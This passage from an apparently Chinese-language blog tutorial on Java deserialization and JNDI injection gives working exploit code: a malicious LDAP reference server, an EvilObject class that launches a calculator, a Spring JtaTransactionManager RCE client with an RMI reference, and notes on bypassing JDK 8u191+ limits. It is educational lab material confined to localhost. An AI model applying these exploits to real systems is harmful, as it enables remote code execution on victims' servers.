punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span>InMemoryDirectoryServerConfig<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span>InMemoryListenerConfig<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span>interceptor<span class="token punctuation">.</span>InMemoryInterceptedSearchResult<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span>interceptor<span class="token punctuation">.</span>InMemoryOperationInterceptor<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>sdk<span class="token punctuation">.</span>Entry<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>sdk<span class="token punctuation">.</span>LDAPException<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>sdk<span class="token punctuation">.</span>LDAPResult<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>sdk<span class="token punctuation">.</span>ResultCode<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LdapServer</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String LDAP_BASE <span class="token operator">=</span> <span class="token string">"dc=example,dc=com"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span> <span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        String url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:8000/#EvilObject"</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> port <span class="token operator">=</span> <span class="token number">1234</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            InMemoryDirectoryServerConfig config <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InMemoryDirectoryServerConfig</span><span class="token punctuation">(</span>LDAP_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span>            config<span class="token punctuation">.</span><span class="token function">setListenerConfigs</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InMemoryListenerConfig</span><span class="token punctuation">(</span>                    <span class="token string">"listen"</span><span class="token punctuation">,</span>                    InetAddress<span class="token punctuation">.</span><span class="token function">getByName</span><span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    port<span class="token punctuation">,</span>                    ServerSocketFactory<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    SocketFactory<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token punctuation">(</span>SSLSocketFactory<span class="token punctuation">)</span> SSLSocketFactory<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            config<span class="token punctuation">.</span><span class="token function">addInMemoryOperationInterceptor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">OperationInterceptor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            InMemoryDirectoryServer ds <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InMemoryDirectoryServer</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Listening on 0.0.0.0:"</span> <span class="token operator">+</span> port<span class="token punctuation">)</span><span class="token punctuation">;</span>            ds<span class="token punctuation">.</span><span class="token function">startListening</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span> Exception e <span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">OperationInterceptor</span> <span class="token keyword">extends</span> <span class="token class-name">InMemoryOperationInterceptor</span> <span class="token punctuation">{</span>        <span class="token keyword">private</span> URL codebase<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/**         *         */</span>        <span class="token keyword">public</span> <span class="token function">OperationInterceptor</span> <span class="token punctuation">(</span> URL cb <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>codebase <span class="token operator">=</span> cb<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/**         * {@inheritDoc}         *         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)         */</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">processSearchResult</span> <span class="token punctuation">(</span> InMemoryInterceptedSearchResult result <span class="token punctuation">)</span> <span class="token punctuation">{</span>            String base <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBaseDN</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Entry e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Entry</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token function">sendResult</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> base<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">catch</span> <span class="token punctuation">(</span> Exception e1 <span class="token punctuation">)</span> <span class="token punctuation">{</span>                e1<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">sendResult</span> <span class="token punctuation">(</span> InMemoryInterceptedSearchResult result<span class="token punctuation">,</span> String base<span class="token punctuation">,</span> Entry e <span class="token punctuation">)</span> <span class="token keyword">throws</span> LDAPException<span class="token punctuation">,</span> MalformedURLException <span class="token punctuation">{</span>            URL turl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>codebase<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>codebase<span class="token punctuation">.</span><span class="token function">getRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">".class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Send LDAP reference result for "</span> <span class="token operator">+</span> base <span class="token operator">+</span> <span class="token string">" redirecting to "</span> <span class="token operator">+</span> turl<span class="token punctuation">)</span><span class="token punctuation">;</span>            e<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"javaClassName"</span><span class="token punctuation">,</span> <span class="token string">"Exploit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            String cbstring <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>codebase<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> refPos <span class="token operator">=</span> cbstring<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span> refPos <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>                cbstring <span class="token operator">=</span> cbstring<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> refPos<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            e<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"javaCodeBase"</span><span class="token punctuation">,</span> cbstring<span class="token punctuation">)</span><span class="token punctuation">;</span>            e<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"objectClass"</span><span class="token punctuation">,</span> <span class="token string">"javaNamingReference"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            e<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"javaFactory"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>codebase<span class="token punctuation">.</span><span class="token function">getRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            result<span class="token punctuation">.</span><span class="token function">sendSearchEntry</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>            result<span class="token punctuation">.</span><span class="token function">setResult</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">LDAPResult</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> ResultCode<span class="token punctuation">.</span>SUCCESS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>LdapClient</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Context<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>InitialContext<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>NamingException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LdapClient</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            Context ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"ldap://localhost:1234/EvilObject"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            String data <span class="token operator">=</span> <span class="token string">"This is LDAP Client."</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//System.out.println(serv.service(data));</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NamingException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// TODO Auto-generated catch block</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>EvilObject.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EvilObject</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">EvilObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"gnome-calculator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果：</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/30.png"></div><p>在看看函数调用栈：</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/31.png"></div><p>这个单步调试就暂时放下了</p><h2 id="绕过JDK-8u191-等高版本限制"><a href="#绕过JDK-8u191-等高版本限制" class="headerlink" title="绕过JDK 8u191+等高版本限制"></a>绕过JDK 8u191+等高版本限制</h2><p>所以对于Oracle JDK 11.0.1、8u191（有问题？？ 本地1.8.291测试成功）、7u201、6u211或者更高版本的JDK来说，默认环境下之前这些利用方式都已经失效。然而，我们依然可以进行绕过并完成利用。两种绕过方法如下：</p><p>找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。</p><p>利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。</p><p>这两种方式都非常依赖受害者本地CLASSPATH中环境，需要利用受害者本地的Gadget进行攻击。</p><h1 id="java反序列化入门（八）从spring反序列化攻击再探JNDI注入和反序列化的关系"><a href="#java反序列化入门（八）从spring反序列化攻击再探JNDI注入和反序列化的关系" class="headerlink" title="java反序列化入门（八）从spring反序列化攻击再探JNDI注入和反序列化的关系"></a>java反序列化入门（八）从spring反序列化攻击再探JNDI注入和反序列化的关系</h1><h2 id="再谈JNDI"><a href="#再谈JNDI" class="headerlink" title="再谈JNDI"></a>再谈JNDI</h2><ul><li>RMI，java远程方法调用，一种用于实现远程过程调用的应用程序编程接口，常见的两种接口实现为 JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)以及 CORBA</li><li>JNDI，是一个应用程序设计的 API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，JNDI 支持的服务主要有以下几种：DNS、LDAP、 CORBA 对象服务、RMI 等</li></ul><p>简单的来说就是RMI注册的服务可以让 JNDI 应用程序来访问，调用</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/32.png"></div>贴一个RIM+JNDI绑定并调用的图：<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/33.png"></div><h2 id="spring反序列化"><a href="#spring反序列化" class="headerlink" title="spring反序列化"></a>spring反序列化</h2><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>ubuntu idea<br>java-1.7<br>spring-4.3.18<br>在运行的前要注意需要再maven里面安装jta.jar不然会报错找不到类</p><h3 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h3><p>定位到：spring-tx-4.3.18.RELEASE.jar -&gt; org.springframework-&gt;transaction-&gt;jta-&gt;JtaTransactionManager-&gt;readObject函数</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/34.png"></div><p>跟进initUserTransactionAndTransactionManager()方法：</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/35.png"></div><p>继续跟进lookupUserTransaction函数</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/36.png"></div><p>定位到</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">return</span> <span class="token punctuation">(</span>UserTransaction<span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getJndiTemplate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>userTransactionName<span class="token punctuation">,</span> UserTransaction<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>userTransactionName变量传入了lookup，如果这里的userTransactionName可控，就能够利用lookup</p><p>那么我们看看这个类里面定义的setUserTransactionName就可以了：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setUserTransactionName</span><span class="token punctuation">(</span>String userTransactionName<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>userTransactionName <span class="token operator">=</span> userTransactionName<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>那么思路就是，在反序列化时，控制userTransactionName为rmi恶意类，同时因为反序列化会自动去调用readObj，然后触发initUserTransactionAndTransactionManager里的lookup，于是造成JNDI RCE。</p><h3 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h3><p>ExploitClient.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>HttpFileHandler<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>net<span class="token punctuation">.</span>httpserver<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ExploitClient</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            String serverAddress <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> port <span class="token operator">=</span> <span class="token number">8000</span><span class="token punctuation">;</span>            String localAddress<span class="token operator">=</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Starting HTTP server"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            HttpServer httpServer <span class="token operator">=</span> HttpServer<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InetSocketAddress</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            httpServer<span class="token punctuation">.</span><span class="token function">createContext</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">HttpFileHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            httpServer<span class="token punctuation">.</span><span class="token function">setExecutor</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>            httpServer<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Creating RMI Registry"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//rmi注册端口</span>            Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Reference reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Reference</span><span class="token punctuation">(</span><span class="token string">"ExportObject"</span><span class="token punctuation">,</span><span class="token string">"ExportObject"</span><span class="token punctuation">,</span><span class="token string">"http://"</span><span class="token operator">+</span>serverAddress<span class="token operator">+</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ReferenceWrapper referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>ReferenceWrapper</span><span class="token punctuation">(</span>reference<span class="token punctuation">)</span><span class="token punctuation">;</span>            registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"Object"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Connecting to server "</span><span class="token operator">+</span>serverAddress<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span>            Socket socket<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Socket</span><span class="token punctuation">(</span>serverAddress<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Connected to server"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// payload</span>            String jndiAddress <span class="token operator">=</span> <span class="token string">"rmi://"</span><span class="token operator">+</span>localAddress<span class="token operator">+</span><span class="token string">":1099/Object"</span><span class="token punctuation">;</span>            org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>transaction<span class="token punctuation">.</span>jta<span class="token punctuation">.</span>JtaTransactionManager object <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>transaction<span class="token punctuation">.</span>jta<span class="token punctuation">.</span>JtaTransactionManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 调用该函数对被反序列化的参数进行设定</span>            object<span class="token punctuation">.</span><span class="token function">setUserTransactionName</span><span class="token punctuation">(</span>jndiAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Sending object to server..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ObjectOutputStream objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 对对象进行序列化</span>            objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>            objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ExploitableServer.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ExploitableServer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//create socket</span>            ServerSocket serverSocket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServerSocket</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Server started on port "</span><span class="token operator">+</span>serverSocket<span class="token punctuation">.</span><span class="token function">getLocalPort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token 